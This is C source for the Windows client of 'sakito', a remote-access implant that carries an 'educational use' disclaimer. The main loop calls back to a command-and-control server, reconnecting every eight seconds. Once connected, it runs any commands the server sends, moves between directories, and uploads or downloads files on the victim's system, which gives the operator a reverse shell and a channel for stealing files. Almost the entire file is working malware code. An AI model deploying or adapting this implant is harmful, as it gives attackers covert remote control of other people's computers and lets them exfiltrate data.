/* 
Coded by d4rkstat1c.
Use educationally/legally.
*/
#include <ws2tcpip.h>
#include <stdint.h>
#include <errno.h>
#include <stdio.h>
#include "sakito_core.h"

#define HOST "127.0.0.1"
#define PORT 4443

#pragma comment(lib, "Ws2_32.lib")

// Function to create connect socket.
const SOCKET create_socket() {
	// Initialize winsock
	WSADATA wsData;
	WORD ver = MAKEWORD(2, 2);

	if (WSAStartup(ver, &wsData) != 0)
		return INVALID_SOCKET;

	// Create socket and hint structure
	const SOCKET connect_socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

	//const SOCKET connect_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (connect_socket == INVALID_SOCKET)
		WSACleanup();

	return connect_socket;
}

// Function to connect the connect socket to c2 server.
int c2_connect(const SOCKET connect_socket) {
	// Create hint structure.
	struct sockaddr_in hint;
	hint.sin_family = AF_INET;
	hint.sin_port = htons(PORT);
	inet_pton(AF_INET, HOST, &hint.sin_addr);

	// Connect to server hosting c2 service
	if (connect(connect_socket, (struct sockaddr*)&hint, sizeof(hint)) == SOCKET_ERROR) {
		closesocket(connect_socket);
		return SOCKET_ERROR;
	}

	return SUCCESS;
}

// Function to execute command.
BOOL exec_cmd(const SOCKET connect_socket, char* const buf) {
	// Execute command via CreateProcess.
	BOOL i_result = sakito_win_cp(connect_socket, buf);

	// Send EOS byte to server indicating end of stream.
	if (send(connect_socket, EOS, 1, 0) < 1)
		return SOCKET_ERROR;

	return i_result;
}

int ch_dir(char* const dir, SOCKET connect_socket) {
	char chdir_result[] = "1";
	_chdir(dir);
	if (errno == ENOENT)
		chdir_result[0] = '0';

	// Send change directory result to server.
	if (send(connect_socket, chdir_result, 1, 0) < 1)
		return SOCKET_ERROR;

	return SUCCESS;
}

// Function to receive file from client (TCP file transfer).
int send_file(const SOCKET connect_socket, char* const buf) {
	// Default f_size value = -1
	int32_t f_size = FAILURE;

	// Open file with read permissions.
	HANDLE h_file = sakito_win_openf(buf+1, GENERIC_READ, OPEN_EXISTING);

	// If File Exists.
	if (h_file != INVALID_HANDLE_VALUE) {
	   	// Get file size and serialize file size bytes.
		LARGE_INTEGER largeint_struct;
		GetFileSizeEx(h_file, &largeint_struct);
		f_size = (int32_t)largeint_struct.QuadPart;
	}

	// Send read file bytes to server.
	if (sakito_win_sendf(h_file, connect_socket, buf, f_size) < 1)
		return SOCKET_ERROR;

	// Receive file transfer finished byte.
	if (recv(connect_socket, buf, 1, 0) < 1)
		return SOCKET_ERROR;

	return SUCCESS;
}

// Function to receive file from client (TCP file transfer).
int recv_file(const SOCKET connect_socket, char* const buf) {
	HANDLE h_file = sakito_win_openf(buf+1, GENERIC_WRITE, CREATE_ALWAYS);

	// Send file transfer start byte.
	if (send(connect_socket, FTRANSFER_START, 1, 0) < 1)
		return SOCKET_ERROR;

	// Receive file size.
	if (recv(connect_socket, buf, sizeof(int32_t), 0) < 1)
		return SOCKET_ERROR;

	// Deserialize f_size.
	int32_t f_size = ntohl_conv(&*(buf));

	// Initialize i_result to true/1.
	int i_result = SUCCESS;

	// If file exists.
	if (f_size > 0)
		// Windows TCP file transfer (recv) function located in sakito_tools.h.
		i_result = sakito_win_recvf(h_file, connect_socket, buf, f_size);

	// Close the file.
	CloseHandle(h_file);

	return i_result;
}

int send_cwd(char* const buf, SOCKET connect_socket) {
	// Store working directory in buf.
	GetCurrentDirectory(BUFLEN, buf);

	// Send buf bytes containing current working directory to server.
	if (send(connect_socket, buf, strlen(buf)+1, 0) < 1)
		return SOCKET_ERROR;

	return SUCCESS;
}

// Main function for connecting to c2 server & parsing c2 commands.
int main(void) {
	while (1) {
		// Create the connect socket.
		const SOCKET connect_socket = create_socket();

		/* 
		If connected to c2 recursively loop to receive/parse c2 commands. If an error-
	    	occurs (connection lost, etc) break the loop and reconnect & restart loop. The switch-
		statement will parse & execute functions based on the order of probability.
		*/
		if (connect_socket != INVALID_SOCKET) {
			int i_result = c2_connect(connect_socket);

			if (i_result) {
				_init:
				// 8192 == Max command line command length in windows + 1 for null termination.
				char buf[BUFLEN+1] = { 0 };
				i_result = recv(connect_socket, buf, 1, 0);
				
				while (i_result > 0) {
					// Send current working directory to server.
					if (send_cwd(buf, connect_socket) < 1)
						break;

					// Set all bytes in buffer to zero.
					memset(buf, '\0', BUFLEN);

					// Receive command + parsed data.
					if (recv(connect_socket, buf, BUFLEN, 0) < 1)
						break;

					// buf[0] is the command code and buf+1 is pointing to the parsed data.
					switch (buf[0]) {
						case '0':
							i_result = exec_cmd(connect_socket, buf+1);
							break;
						case '1':
							// Change directory.
							i_result = ch_dir(buf+1, connect_socket);
							break;
						case '2':
							// Exit.
							return EXIT_SUCCESS;
						case '3':
							// Upload file to client system.
							i_result = recv_file(connect_socket, buf);
							break;
						case '4':
							// Download file from client system.
							i_result = send_file(connect_socket, buf);
							break;
						case '5':
							// Reinitiate connection (backgrounded).
							goto _init;
						case '6':
							// Server-side error occurred re-receive command.
							break;
					}
				}
			}
		}

		// If unable to connect or an error occurs sleep 8 seconds.
		Sleep(8000);
	}

	return FAILURE;
}
